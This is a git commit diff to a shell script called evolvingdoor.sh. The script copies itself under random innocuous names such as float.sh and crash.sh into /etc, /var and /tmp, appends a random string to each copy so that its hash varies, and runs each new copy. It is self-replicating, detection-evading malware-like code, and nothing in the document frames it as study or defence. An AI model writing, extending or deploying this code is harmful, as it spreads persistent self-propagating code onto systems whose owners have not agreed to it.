24f454872b1d0211c649a4f6ca885150e95bbe15
le-jack <121248116+le-jack@users.noreply.github.com>
2024-05-06 12:39:49 -0400

    Add files via upload

--- evolvingdoor.sh
+++ evolvingdoor.sh
@@ -2,9 +2,21 @@
 
 dirs=("/etc" "/var" "/var/tmp" "/tmp")
 names=("float.sh" "sink.sh" "burn.sh" "crash.sh")
+append=("AAAA" "BBBB" "CCCC" "DDDD" "EEEE" "FFFF" "aaaa" "bbbb" "cccc" "dddd" "eeee" "ffff")
 rando=${names[RANDOM%4]}
-
+rappend=${append[RANDOM%12]}
 
 for dir in ${dirs[@]}; do
-	cp ${0} "$dir/$rando" 2>/dev/null && break
+	counter=0
+	for name in ${names[@]}; do
+		findo=$(find "$dir/" -iname "$name" 2>/dev/null)
+		if [ -z "$findo" ]; then
+			let counter++
+			echo "$findo"
+			echo "$counter"
+			if [ $counter = ${#names[@]} ]; then
+				cp ${0} "$dir/$rando" 2>/dev/null && echo "$rappend" >> "$dir/$rando" && "$dir/$rando" && break
+			fi
+		fi
+	done
 done
